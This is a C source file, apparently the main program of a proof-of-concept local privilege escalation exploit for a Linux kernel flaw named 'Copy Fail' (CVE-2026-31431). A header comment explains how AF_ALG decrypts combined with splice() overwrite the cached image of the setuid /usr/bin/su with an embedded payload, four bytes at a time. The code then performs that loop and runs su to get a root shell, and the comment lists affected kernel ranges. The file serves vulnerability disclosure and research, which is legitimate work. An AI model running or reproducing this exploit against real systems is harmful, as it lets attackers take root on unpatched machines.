/* SPDX-License-Identifier: LGPL-2.1-or-later OR MIT */
/*
 * Copy Fail -- CVE-2026-31431
 * AF_ALG + splice() page-cache-mutation LPE proof-of-concept.
 *
 * Cross-platform C proof-of-concept by Tony Gies <tony.gies@crashunited.com>.
 *
 * Disclosed 2026-04-29 by Theori / Xint. Canonical writeup: https://copy.fail/
 *
 * Mechanism:
 *   For each 4-byte window of the embedded static-ELF payload (built from
 *   payload.c, embedded via `ld -r -b binary` -- see Makefile), runs one
 *   bogus AEAD-decrypt through AF_ALG whose ciphertext input is supplied
 *   via splice() from /usr/bin/su's page-cache pages. The authencesn
 *   template's in-place optimization treats the splice'd source pages as
 *   both ciphertext input and plaintext destination, so the (failing)
 *   decrypt has already overwritten 4 bytes of the page-cache page by
 *   the time auth verification rejects the request. Walking 4 bytes at
 *   a time across the payload deterministically writes the entire blob
 *   into the cached image of /usr/bin/su. execve() of the target loads
 *   the (mutated) cached pages; the unchanged on-disk inode is still
 *   setuid root, so the kernel hands the payload root creds; payload
 *   pivots into a real root shell.
 *
 * Affected kernels:
 *   floor:   torvalds/linux 72548b093ee3 (Aug 2017, 4.14, AF_ALG iov_iter
 *            rework that introduced the file-page write primitive)
 *   ceiling: torvalds/linux a664bf3d603d (Apr 2026, reverts the 2017
 *            algif_aead in-place optimization; separates src/dst
 *            scatterlists so page-cache pages can no longer be a writable
 *            crypto destination)
 *   in between: every Ubuntu, RHEL, SUSE, Amazon Linux, Debian etc.
 *   distro kernel that didn't backport the fix.
 *
 * Build: see Makefile. (`make` in this directory.)
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <sys/types.h>

#include "utils.h"

/* Symbols synthesized by `ld -r -b binary -o payload.o payload`. */
extern const unsigned char _binary_payload_start[];
extern const unsigned char _binary_payload_end[];
#define PAYLOAD       (_binary_payload_start)
#define PAYLOAD_LEN   ((size_t)(_binary_payload_end - _binary_payload_start))

int main(int argc, char **argv) {
    const char *target = (argc > 1) ? argv[1] : "/usr/bin/su";

    int file_fd = open(target, O_RDONLY);
    if (file_fd < 0) {
        fprintf(stderr, "open(%s): %s\n", target, strerror(errno));
        return 1;
    }

    size_t len = PAYLOAD_LEN;
    size_t iters = (len + 3) / 4;

    fprintf(stderr, "[+] target:    %s\n", target);
    fprintf(stderr, "[+] payload:   %zu bytes (%zu iterations)\n", len, iters);

    /* Walk the embedded payload in 4-byte windows. Last window is zero-
     * padded if PAYLOAD_LEN isn't a multiple of 4 (the extra bytes simply
     * land past end-of-payload in the page-cache page; harmless). */
    for (off_t off = 0; (size_t)off < len; off += 4) {
        unsigned char window[4] = { 0, 0, 0, 0 };
        size_t take = (len - (size_t)off >= 4) ? 4 : len - (size_t)off;
        memcpy(window, PAYLOAD + off, take);

        if (patch_chunk(file_fd, off, window) < 0) {
            fprintf(stderr, "patch_chunk failed at offset %lld\n",
                    (long long)off);
            return 1;
        }
    }

    close(file_fd);

    fprintf(stderr, "[+] page cache mutated; exec'ing target\n");
    execl("/bin/sh", "sh", "-c", "su", (char *)NULL);
    perror("execl");
    return 1;
}
